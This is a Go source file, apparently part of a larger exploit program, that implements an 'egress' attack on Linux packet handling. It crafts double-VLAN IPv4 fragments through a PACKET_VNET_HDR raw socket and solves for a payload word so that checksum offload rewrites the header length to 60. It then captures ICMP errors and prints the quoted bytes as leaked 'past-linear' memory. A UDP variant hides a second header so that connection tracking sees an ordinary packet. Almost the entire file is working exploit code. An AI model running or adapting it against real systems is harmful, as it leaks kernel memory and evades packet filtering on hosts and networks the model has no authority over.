package main

import (
	"bufio"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"math/bits"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
)

const (
	solPacket     = 263
	packetVnetHdr = 15
	ethPAll       = 0x0003
	ipProtoICMP   = 1
	ipProtoUDP    = 17
	ipProtoRaw    = 253
	mutatedIHL    = 60
)

type egressRoute struct {
	iface   string
	dest    uint32
	gateway uint32
	mask    uint32
	prefix  int
}

type egressCaptureStats struct {
	txFragments int
	icmpPackets int
	quoted253   int
	quotedUDP   int
	matched     bool
}

func runEgress(c cfg) error {
	ifi, err := net.InterfaceByName(c.iface)
	if err != nil {
		return fmt.Errorf("egress interface %s: %w", c.iface, err)
	}
	if len(ifi.HardwareAddr) != 6 {
		return fmt.Errorf("egress interface %s has unsupported MAC %s", c.iface, ifi.HardwareAddr)
	}
	src, err := egressSourceIP(ifi, c.src)
	if err != nil {
		return err
	}
	dst, err := egressResolveIPv4(c.dst)
	if err != nil {
		return err
	}
	nextHop, route, err := egressNextHop(c.iface, dst, c.gateway)
	if err != nil {
		return err
	}
	nextMAC, err := egressNextMAC(c.iface, src, dst, nextHop, c.dstMAC)
	if err != nil {
		return err
	}

	tx, err := egressPacketSocket(ifi.Index, true)
	if err != nil {
		return fmt.Errorf("open PACKET_VNET_HDR tx socket: %w", err)
	}
	defer syscall.Close(tx)
	rx, err := egressPacketSocket(ifi.Index, false)
	if err != nil {
		return fmt.Errorf("open capture socket: %w", err)
	}
	defer syscall.Close(rx)

	// The two VLAN headers live inside the raw frame, so keep the IPv4
	// fragment below MTU by their full eight-byte cost.
	maxChunk := ((ifi.MTU - ipLen - 2*vlanLen) / 8) * 8
	if maxChunk < 8 {
		return fmt.Errorf("interface MTU %d is too small for double-VLAN IPv4 fragments", ifi.MTU)
	}
	fragments := (c.egressRest + maxChunk - 1) / maxChunk
	proto := byte(ipProtoRaw)
	if c.transport == "udp" {
		proto = ipProtoUDP
	}
	fmt.Printf("egress: iface=%s mtu=%d src=%s src_mac=%s dst=%s next_hop=%s next_mac=%s route=%s/%d transport=%s payload=%d fragments=%d+head\n",
		ifi.Name, ifi.MTU, src, ifi.HardwareAddr, dst, nextHop, nextMAC,
		routeIPv4(route.dest), route.prefix, c.transport, c.head+c.egressRest, fragments)

	seen := false
	for sample := 0; sample < c.count; sample++ {
		id := uint16(ipID + sample)
		payload := make([]byte, c.head+c.egressRest)
		for i := range payload {
			payload[i] = 0x11
		}
		if c.transport == "udp" {
			egressUDPHeaders(payload, uint16(c.udpPort))
		} else {
			for i := 0; i < c.head; i++ {
				payload[i] = marker
			}
		}
		if !egressSolve(payload, id, src, dst, proto) {
			return fmt.Errorf("sample %d: solver found no 0x4f00 adjustment", sample)
		}
		if err := egressSendSequence(tx, ifi, ifi.HardwareAddr, nextMAC, src, dst, id, proto, payload, c.head, maxChunk); err != nil {
			return fmt.Errorf("sample %d: %w", sample, err)
		}
		stats, err := egressCollectICMP(rx, c.egressWait, id, dst, proto, c.head)
		if err != nil {
			return fmt.Errorf("sample %d capture: %w", sample, err)
		}
		fmt.Printf("capture: id=0x%04x tx_fragments=%d icmp=%d quoted_udp=%d quoted_proto253=%d matched=%t\n",
			id, stats.txFragments, stats.icmpPackets, stats.quotedUDP, stats.quoted253, stats.matched)
		seen = seen || stats.matched
	}
	if !seen {
		return errors.New("no matching ICMP quotation received; confirm the destination emits protocol-unreachable ICMP or capture packets at the controlled endpoint")
	}
	return nil
}

func egressUDPHeaders(payload []byte, dstPort uint16) {
	// Before the checksum write, conntrack sees this ordinary UDP header at
	// payload offset zero. A zero IPv4 UDP checksum is valid.
	putUDPHeader(payload[:8], 0x0101, dstPort, uint16(len(payload)))
	// After IHL changes from 20 to 60, fragmentation skips 40 bytes of the
	// original payload. This duplicate becomes the UDP header on the wire.
	putUDPHeader(payload[40:48], 0x0101, dstPort, uint16(len(payload)-40))
}

func putUDPHeader(dst []byte, srcPort, dstPort, length uint16) {
	binary.BigEndian.PutUint16(dst[0:2], srcPort)
	binary.BigEndian.PutUint16(dst[2:4], dstPort)
	binary.BigEndian.PutUint16(dst[4:6], length)
	binary.BigEndian.PutUint16(dst[6:8], 0)
}

func egressSourceIP(ifi *net.Interface, override string) (net.IP, error) {
	if override != "" {
		ip := net.ParseIP(override).To4()
		if ip == nil {
			return nil, fmt.Errorf("invalid -src IPv4 address %q", override)
		}
		return ip, nil
	}
	addrs, err := ifi.Addrs()
	if err != nil {
		return nil, fmt.Errorf("list %s addresses: %w", ifi.Name, err)
	}
	for _, addr := range addrs {
		ip, _, err := net.ParseCIDR(addr.String())
		if err == nil && ip.To4() != nil {
			return ip.To4(), nil
		}
	}
	return nil, fmt.Errorf("interface %s has no IPv4 address", ifi.Name)
}

func egressResolveIPv4(name string) (net.IP, error) {
	if ip := net.ParseIP(name).To4(); ip != nil {
		return ip, nil
	}
	ips, err := net.LookupIP(name)
	if err != nil {
		return nil, fmt.Errorf("resolve %s: %w", name, err)
	}
	for _, ip := range ips {
		if ip4 := ip.To4(); ip4 != nil {
			return ip4, nil
		}
	}
	return nil, fmt.Errorf("%s has no IPv4 address", name)
}

func egressNextHop(iface string, dst net.IP, override string) (net.IP, egressRoute, error) {
	if override != "" {
		ip := net.ParseIP(override).To4()
		if ip == nil {
			return nil, egressRoute{}, fmt.Errorf("invalid -gateway IPv4 address %q", override)
		}
		return ip, egressRoute{iface: iface}, nil
	}
	routes, err := egressRoutes()
	if err != nil {
		return nil, egressRoute{}, err
	}
	d := routeUint(dst)
	best := egressRoute{prefix: -1}
	for _, route := range routes {
		if route.iface == iface && d&route.mask == route.dest&route.mask && route.prefix > best.prefix {
			best = route
		}
	}
	if best.prefix < 0 {
		return nil, egressRoute{}, fmt.Errorf("no route to %s through %s", dst, iface)
	}
	if best.gateway == 0 {
		return dst, best, nil
	}
	return routeIPv4(best.gateway), best, nil
}

func egressRoutes() ([]egressRoute, error) {
	f, err := os.Open("/proc/net/route")
	if err != nil {
		return nil, fmt.Errorf("read routes: %w", err)
	}
	defer f.Close()
	var out []egressRoute
	s := bufio.NewScanner(f)
	for s.Scan() {
		fields := strings.Fields(s.Text())
		if len(fields) < 8 || fields[0] == "Iface" {
			continue
		}
		dest, e1 := strconv.ParseUint(fields[1], 16, 32)
		gateway, e2 := strconv.ParseUint(fields[2], 16, 32)
		flags, e3 := strconv.ParseUint(fields[3], 16, 32)
		mask, e4 := strconv.ParseUint(fields[7], 16, 32)
		if e1 != nil || e2 != nil || e3 != nil || e4 != nil || flags&1 == 0 {
			continue
		}
		out = append(out, egressRoute{
			iface: fields[0], dest: uint32(dest), gateway: uint32(gateway), mask: uint32(mask),
			prefix: bits.OnesCount32(uint32(mask)),
		})
	}
	if err := s.Err(); err != nil {
		return nil, fmt.Errorf("scan routes: %w", err)
	}
	return out, nil
}

func egressNextMAC(iface string, src, dst, nextHop net.IP, override string) (net.HardwareAddr, error) {
	if override != "" {
		mac, err := net.ParseMAC(override)
		if err != nil || len(mac) != 6 {
			return nil, fmt.Errorf("invalid -dst-mac %q", override)
		}
		return mac, nil
	}
	if mac := egressARP(iface, nextHop); mac != nil {
		return mac, nil
	}
	conn, err := net.DialUDP("udp4", &net.UDPAddr{IP: src}, &net.UDPAddr{IP: dst, Port: 9})
	if err == nil {
		_, _ = conn.Write([]byte{0})
		_ = conn.Close()
	}
	for i := 0; i < 20; i++ {
		if mac := egressARP(iface, nextHop); mac != nil {
			return mac, nil
		}
		time.Sleep(50 * time.Millisecond)
	}
	return nil, fmt.Errorf("no ARP entry for next hop %s on %s; supply -dst-mac", nextHop, iface)
}

func egressARP(iface string, ip net.IP) net.HardwareAddr {
	f, err := os.Open("/proc/net/arp")
	if err != nil {
		return nil
	}
	defer f.Close()
	s := bufio.NewScanner(f)
	for s.Scan() {
		fields := strings.Fields(s.Text())
		if len(fields) < 6 || fields[0] != ip.String() || fields[5] != iface {
			continue
		}
		flags, _ := strconv.ParseUint(strings.TrimPrefix(fields[2], "0x"), 16, 32)
		mac, err := net.ParseMAC(fields[3])
		if err == nil && len(mac) == 6 && flags&2 != 0 {
			return mac
		}
	}
	return nil
}

func egressPacketSocket(ifindex int, vnet bool) (int, error) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(ethPAll)))
	if err != nil {
		return -1, err
	}
	if vnet {
		if err := syscall.SetsockoptInt(fd, solPacket, packetVnetHdr, 1); err != nil {
			syscall.Close(fd)
			return -1, err
		}
	}
	if err := syscall.Bind(fd, &syscall.SockaddrLinklayer{Protocol: htons(ethPAll), Ifindex: ifindex}); err != nil {
		syscall.Close(fd)
		return -1, err
	}
	if !vnet {
		_ = syscall.SetsockoptTimeval(fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO, &syscall.Timeval{Usec: 10000})
	}
	return fd, nil
}

func egressSendSequence(fd int, ifi *net.Interface, srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP, id uint16, proto byte, payload []byte, head, maxChunk int) error {
	for offset := head; offset < len(payload); {
		n := min(maxChunk, len(payload)-offset)
		more := offset+n < len(payload)
		ip := egressFragment(offset, more, payload[offset:offset+n], id, srcIP, dstIP, proto)
		if err := egressSendFrame(fd, ifi.Index, dstMAC, egressFrame(ip, srcMAC, dstMAC), true, l2Len+ipLen); err != nil {
			return fmt.Errorf("send fragment offset=%d length=%d: %w", offset, n, err)
		}
		offset += n
	}
	first := egressFragment(0, true, payload[:head], id, srcIP, dstIP, proto)
	if err := egressSendFrame(fd, ifi.Index, dstMAC, egressFrame(first, srcMAC, dstMAC), true, csumAtIP); err != nil {
		return fmt.Errorf("send head fragment: %w", err)
	}
	fmt.Printf("sent: id=0x%04x head=%d rest=%d adjustment=%02x%02x\n", id, head, len(payload)-head, payload[12], payload[13])
	return nil
}

func egressSendFrame(fd, ifindex int, dstMAC net.HardwareAddr, frame []byte, checksum bool, start uint16) error {
	buf := make([]byte, 10+len(frame))
	if checksum {
		buf[0] = needsCsum
		binary.LittleEndian.PutUint16(buf[6:], start)
	}
	copy(buf[10:], frame)
	addr := &syscall.SockaddrLinklayer{Protocol: htons(vlanProto), Ifindex: ifindex, Halen: 6}
	copy(addr.Addr[:], dstMAC)
	return syscall.Sendto(fd, buf, 0, addr)
}

func egressSolve(payload []byte, id uint16, src, dst net.IP, proto byte) bool {
	const adjust = 32
	if adjust+1 >= ipLen+len(payload) {
		return false
	}
	off := adjust - ipLen
	for word := 0; word < 65536; word++ {
		payload[off] = byte(word)
		payload[off+1] = byte(word >> 8)
		pkt := egressFragment(0, false, payload, id, src, dst, proto)
		forwardTTL(pkt)
		if csumFold(csumPartial(pkt)) == 0x004f {
			return true
		}
	}
	return false
}

func egressFragment(offset int, more bool, payload []byte, id uint16, src, dst net.IP, protoOpt ...byte) []byte {
	proto := byte(ipProtoRaw)
	if len(protoOpt) > 0 {
		proto = protoOpt[0]
	}
	pkt := make([]byte, ipLen+len(payload))
	pkt[0] = 0x45
	binary.BigEndian.PutUint16(pkt[2:], uint16(len(pkt)))
	binary.BigEndian.PutUint16(pkt[4:], id)
	frag := uint16(offset / 8)
	if more {
		frag |= 0x2000
	}
	binary.BigEndian.PutUint16(pkt[6:], frag)
	pkt[8] = 64
	pkt[9] = proto
	copy(pkt[12:16], src.To4())
	copy(pkt[16:20], dst.To4())
	copy(pkt[ipLen:], payload)
	binary.BigEndian.PutUint16(pkt[10:], ipChecksum(pkt[:ipLen]))
	return pkt
}

func egressFrame(ip []byte, src, dst net.HardwareAddr) []byte {
	f := make([]byte, l2Len+len(ip))
	copy(f[0:6], dst)
	copy(f[6:12], src)
	binary.BigEndian.PutUint16(f[12:], vlanProto)
	binary.BigEndian.PutUint16(f[14:], 0)
	binary.BigEndian.PutUint16(f[16:], vlanProto)
	binary.BigEndian.PutUint16(f[18:], 0)
	binary.BigEndian.PutUint16(f[20:], ipProtoEth)
	copy(f[l2Len:], ip)
	return f
}

func egressCollectICMP(fd int, wait time.Duration, id uint16, dst net.IP, proto byte, head int) (egressCaptureStats, error) {
	deadline := time.Now().Add(wait)
	buf := make([]byte, 65536)
	stats := egressCaptureStats{}
	for time.Now().Before(deadline) {
		n, _, err := syscall.Recvfrom(fd, buf, 0)
		if err != nil {
			if errors.Is(err, syscall.EAGAIN) || errors.Is(err, syscall.EWOULDBLOCK) {
				continue
			}
			return stats, err
		}
		outer := ipv4Of(buf[:n])
		if len(outer) < ipLen {
			continue
		}
		if outer[9] == proto && binary.BigEndian.Uint16(outer[4:]) == id {
			stats.txFragments++
		}
		if outer[9] != ipProtoICMP {
			continue
		}
		stats.icmpPackets++
		outerIHL := int(outer[0]&0x0f) * 4
		if outerIHL < ipLen || len(outer) < outerIHL+8+ipLen {
			continue
		}
		icmp := outer[outerIHL:]
		if icmp[0] != 3 && icmp[0] != 11 && icmp[0] != 12 {
			continue
		}
		quoted := icmp[8:]
		if quoted[0]>>4 != 4 {
			continue
		}
		switch quoted[9] {
		case ipProtoRaw:
			stats.quoted253++
		case ipProtoUDP:
			stats.quotedUDP++
		}
		if quoted[9] != proto {
			continue
		}
		quotedID := binary.BigEndian.Uint16(quoted[4:])
		quotedDst := net.IP(quoted[16:20])
		if quotedID != id || !quotedDst.Equal(dst) {
			fmt.Printf("icmp-unmatched: type=%d code=%d quoted_id=0x%04x quoted_dst=%s expected_id=0x%04x expected_dst=%s\n",
				icmp[0], icmp[1], quotedID, quotedDst, id, dst)
			continue
		}
		stats.matched = true
		ihl := int(quoted[0]&0x0f) * 4
		available := min(ihl, len(quoted))
		fmt.Printf("icmp: type=%d code=%d id=0x%04x first=0x%02x ihl=%d quoted=%d\n",
			icmp[0], icmp[1], id, quoted[0], ihl, len(quoted))
		if available > ipLen {
			options := quoted[ipLen:available]
			fmt.Printf("  options %d bytes: %s\n", len(options), hex.EncodeToString(options))
			if len(options) > head {
				leak := options[head:]
				fmt.Printf("  past-linear hex=%s ascii=%q\n", hex.EncodeToString(leak), string(leak))
			}
		}
	}
	return stats, nil
}

func routeUint(ip net.IP) uint32 {
	ip = ip.To4()
	return uint32(ip[0]) | uint32(ip[1])<<8 | uint32(ip[2])<<16 | uint32(ip[3])<<24
}

func routeIPv4(v uint32) net.IP {
	return net.IPv4(byte(v), byte(v>>8), byte(v>>16), byte(v>>24)).To4()
}
